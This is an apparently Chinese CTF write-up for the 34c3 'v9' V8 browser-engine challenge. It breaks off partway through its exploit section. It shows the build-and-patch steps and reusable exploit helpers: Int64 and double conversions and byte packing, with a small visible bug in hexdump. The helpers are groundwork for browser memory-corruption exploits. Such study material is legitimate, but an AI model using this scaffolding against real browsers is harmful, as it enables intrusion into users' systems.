    <content type="html"><![CDATA[<h1 id="34c3-v9-writeup"><a href="#34c3-v9-writeup" class="headerlink" title="34c3 v9 writeup"></a>34c3 v9 writeup</h1><p>很久之前做的了，和*CTF那题差不多，顺便就发出来。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://github.com/saelo/v9" target="_blank" rel="noopener">https://github.com/saelo/v9</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir v9 &amp;&amp; cd v9</span><br><span class="line">fetch v8 &amp;&amp; cd v8           # see https://github.com/v8/v8/wiki/Building-from-Source</span><br><span class="line">git checkout 6.3.292.48</span><br><span class="line">gclient sync</span><br><span class="line">patch -p1 &lt; /path/to/v9.patch</span><br><span class="line">./tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug</span><br></pre></td></tr></table></figure></p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><h3 id="工具类准备"><a href="#工具类准备" class="headerlink" title="工具类准备"></a>工具类准备</h3><p>这部分就是一些可复用的代码。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>.prototype.padLeft =</span><br><span class="line"><span class="built_in">Number</span>.prototype.padLeft = <span class="function"><span class="keyword">function</span>(<span class="params">total, pad</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="built_in">Array</span>(total).join(pad || <span class="number">0</span>) + <span class="keyword">this</span>).slice(-total);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return the hexadecimal representation of the given byte array.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hexlify</span>(<span class="params">bytes</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> res = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bytes.length; i++)&#123;</span><br><span class="line">        <span class="comment">//print(bytes[i].toString(16));</span></span><br><span class="line">        res.push((<span class="string">'0'</span> + bytes[i].toString(<span class="number">16</span>)).substr(<span class="number">-2</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.join(<span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return the binary data represented by the given hexdecimal string.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unhexlify</span>(<span class="params">hexstr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hexstr.length % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Invalid hex string"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(hexstr.length / <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; hexstr.length; i += <span class="number">2</span>)</span><br><span class="line">        bytes[i/<span class="number">2</span>] = <span class="built_in">parseInt</span>(hexstr.substr(i, <span class="number">2</span>), <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hexdump</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> data.BYTES_PER_ELEMENT !== <span class="string">'undefined'</span>)</span><br><span class="line">        data = <span class="built_in">Array</span>.from(data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> lines = [];</span><br><span class="line">        <span class="keyword">var</span> chunk = data.slice(i, i+<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i += <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> parts = chunk.map(hex);</span><br><span class="line">        <span class="keyword">if</span> (parts.length &gt; <span class="number">8</span>)</span><br><span class="line">            parts.splice(<span class="number">8</span>, <span class="number">0</span>, <span class="string">' '</span>);</span><br><span class="line">        lines.push(parts.join(<span class="string">' '</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> lines.join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Simplified version of the similarly named python module.</span></span><br><span class="line"><span class="keyword">var</span> Struct = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Allocate these once to avoid unecessary heap allocations during pack/unpack operations.</span></span><br><span class="line">    <span class="keyword">var</span> buffer      = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">var</span> byteView    = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buffer);</span><br><span class="line">    <span class="keyword">var</span> uint32View  = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer);</span><br><span class="line">    <span class="keyword">var</span> float64View = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        pack: <span class="function"><span class="keyword">function</span>(<span class="params">type, value</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> view = type;        <span class="comment">// See below</span></span><br><span class="line">            view[<span class="number">0</span>] = value;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buffer, <span class="number">0</span>, type.BYTES_PER_ELEMENT);</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        unpack: <span class="function"><span class="keyword">function</span>(<span class="params">type, bytes</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (bytes.length !== type.BYTES_PER_ELEMENT)</span><br><span class="line">                <span class="keyword">throw</span> <span class="built_in">Error</span>(<span class="string">"Invalid bytearray"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> view = type;        <span class="comment">// See below</span></span><br><span class="line">            byteView.set(bytes);</span><br><span class="line">            <span class="keyword">return</span> view[<span class="number">0</span>];</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Available types.</span></span><br><span class="line">        int8:    byteView,</span><br><span class="line">        int32:   uint32View,</span><br><span class="line">        float64: float64View</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Int64</span>(<span class="params">v</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// The underlying byte array.</span></span><br><span class="line">    <span class="keyword">var</span> bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (<span class="keyword">typeof</span> v) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'number'</span>:</span><br><span class="line">            v = <span class="string">'0x'</span> + <span class="built_in">Math</span>.floor(v).toString(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'string'</span>:</span><br><span class="line">            <span class="keyword">if</span> (v.startsWith(<span class="string">'0x'</span>))</span><br><span class="line">                v = v.substr(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span> (v.length % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">                v = <span class="string">'0'</span> + v;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> bigEndian = unhexlify(v, <span class="number">8</span>);</span><br><span class="line">            <span class="comment">//print(bigEndian.toString());</span></span><br><span class="line">            bytes.set(<span class="built_in">Array</span>.from(bigEndian).reverse());</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'object'</span>:</span><br><span class="line">            <span class="keyword">if</span> (v <span class="keyword">instanceof</span> Int64) &#123;</span><br><span class="line">                bytes.set(v.bytes());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (v.length != <span class="number">8</span>)</span><br><span class="line">                    <span class="keyword">throw</span> <span class="built_in">TypeError</span>(<span class="string">"Array must have excactly 8 elements."</span>);</span><br><span class="line">                bytes.set(v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'undefined'</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="built_in">TypeError</span>(<span class="string">"Int64 constructor requires an argument."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return a double whith the same underlying bit representation.</span></span><br><span class="line">    <span class="keyword">this</span>.asDouble = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Check for NaN</span></span><br><span class="line">        <span class="keyword">if</span> (bytes[<span class="number">7</span>] == <span class="number">0xff</span> &amp;&amp; (bytes[<span class="number">6</span>] == <span class="number">0xff</span> || bytes[<span class="number">6</span>] == <span class="number">0xfe</span>))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RangeError</span>(<span class="string">"Integer can not be represented by a double"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Struct.unpack(Struct.float64, bytes);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return a javascript value with the same underlying bit representation.</span></span><br><span class="line">    <span class="comment">// This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)</span></span><br><span class="line">    <span class="comment">// due to double conversion constraints.</span></span><br><span class="line">    <span class="keyword">this</span>.asJSValue = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((bytes[<span class="number">7</span>] == <span class="number">0</span> &amp;&amp; bytes[<span class="number">6</span>] == <span class="number">0</span>) || (bytes[<span class="number">7</span>] == <span class="number">0xff</span> &amp;&amp; bytes[<span class="number">6</span>] == <span class="number">0xff</span>))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RangeError</span>(<span class="string">"Integer can not be represented by a JSValue"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.</span></span><br><span class="line">        <span class="keyword">this</span>.assignSub(<span class="keyword">this</span>, <span class="number">0x1000000000000</span>);</span><br><span class="line">        <span class="keyword">var</span> res = Struct.unpack(Struct.float64, bytes);</span><br><span class="line">        <span class="keyword">this</span>.assignAdd(<span class="keyword">this</span>, <span class="number">0x1000000000000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return the underlying bytes of this number as array.</span></span><br><span class="line">    <span class="keyword">this</span>.bytes = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Array</span>.from(bytes);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return the byte at the given index.</span></span><br><span class="line">    <span class="keyword">this</span>.byteAt = <span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> bytes[i];</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return the value of this number as unsigned hex string.</span></span><br><span class="line">    <span class="keyword">this</span>.toString = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//print("toString");</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'0x'</span> + hexlify(<span class="built_in">Array</span>.from(bytes).reverse());</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Basic arithmetic.</span></span><br><span class="line">    <span class="comment">// These functions assign the result of the computation to their 'this' object.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Decorator for Int64 instance operations. Takes care</span></span><br><span class="line">    <span class="comment">// of converting arguments to Int64 instances if required.</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">operation</span>(<span class="params">f, nargs</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">arguments</span>.length != nargs)</span><br><span class="line">                <span class="keyword">throw</span> <span class="built_in">Error</span>(<span class="string">"Not enough arguments for function "</span> + f.name);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length; i++)</span><br><span class="line">                <span class="keyword">if</span> (!(<span class="built_in">arguments</span>[i] <span class="keyword">instanceof</span> Int64))</span><br><span class="line">                    <span class="built_in">arguments</span>[i] = <span class="keyword">new</span> Int64(<span class="built_in">arguments</span>[i]);</span><br><span class="line">            <span class="keyword">return</span> f.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// this = -n (two's complement)</span></span><br><span class="line">    <span class="keyword">this</span>.assignNeg = operation(<span class="function"><span class="keyword">function</span> <span class="title">neg</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">            bytes[i] = ~n.byteAt(i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.assignAdd(<span class="keyword">this</span>, Int64.One);</span><br><span class="line">    &#125;, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// this = a + b</span></span><br><span class="line">    <span class="keyword">this</span>.assignAdd = operation(<span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> carry = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> cur = a.byteAt(i) + b.byteAt(i) + carry;</span><br><span class="line">            carry = cur &gt; <span class="number">0xff</span> | <span class="number">0</span>;</span><br><span class="line">            bytes[i] = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// this = a - b</span></span><br><span class="line">    <span class="keyword">this</span>.assignSub = operation(<span class="function"><span class="keyword">function</span> <span class="title">sub</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> carry = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> cur = a.byteAt(i) - b.byteAt(i) - carry;</span><br><span class="line">            carry = cur &lt; <span class="number">0</span> | <span class="number">0</span>;</span><br><span class="line">            bytes[i] = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// this = a &amp; b</span></span><br><span class="line">    <span class="keyword">this</span>.assignAnd = operation(<span class="function"><span class="keyword">function</span> <span class="title">and</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            bytes[i] = a.byteAt(i) &amp; b.byteAt(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructs a new Int64 instance with the same bit representation as the provided double.</span></span><br><span class="line">Int64.fromDouble = <span class="function"><span class="keyword">function</span>(<span class="params">d</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> bytes = Struct.pack(Struct.float64, d);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Int64(bytes);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Convenience functions. These allocate a new Int64 to hold the result.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Return -n (two's complement)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Neg</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignNeg(n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return a + b</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Add</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignAdd(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return a - b</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sub</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignSub(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return a &amp; b</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">And</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignAnd(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a == <span class="literal">undefined</span>) <span class="keyword">return</span> <span class="string">"0xUNDEFINED"</span>;</span><br><span class="line">    <span class="keyword">var</span> ret = a.toString(<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret.substr(<span class="number">0</span>,<span class="number">2</span>) != <span class="string">"0x"</span>) <span class="keyword">return</span> <span class="string">"0x"</span>+ret;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lower</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// returns the lower 32bit of double x</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + Int64.fromDouble(x).toString()).substr(<span class="number">-8</span>,<span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upper</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// returns the upper 32bit of double x</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + Int64.fromDouble(x).toString()).substr(<span class="number">-16</span>, <span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lowerint</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// returns the lower 32bit of int x</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + x.toString(<span class="number">16</span>)).substr(<span class="number">-8</span>,<span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upperint</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// returns the upper 32bit of int x</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + x.toString(<span class="number">16</span>)).substr(<span class="number">-16</span>, <span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">combine</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//a = a &gt;&gt;&gt; 0;</span></span><br><span class="line">    <span class="comment">//b = b &gt;&gt;&gt; 0;</span></span><br><span class="line">    <span class="comment">//print(a.toString());</span></span><br><span class="line">    <span class="comment">//print(b.toString());</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(Int64.fromDouble(b).toString() + Int64.fromDouble(a).toString(), <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 